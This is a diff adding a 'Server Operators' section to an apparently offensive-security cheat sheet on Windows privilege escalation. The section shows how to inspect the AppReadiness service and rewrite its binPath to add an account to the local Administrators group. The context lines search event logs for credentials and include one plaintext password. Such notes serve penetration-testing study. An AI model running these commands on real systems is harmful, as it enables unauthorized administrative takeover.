@@ -80,6 +80,16 @@ wevtutil qe Security /rd:true /f:text | Select-String "/user"
 wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
 Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
 ```
+## Server Operators
+Read the privileges of the service
+```
+sc qc AppReadiness
+c:\Tools\PsService.exe security AppReadiness
+```
+Change the path
+```
+sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
+```
 
 # Roles
 ## GenericAll
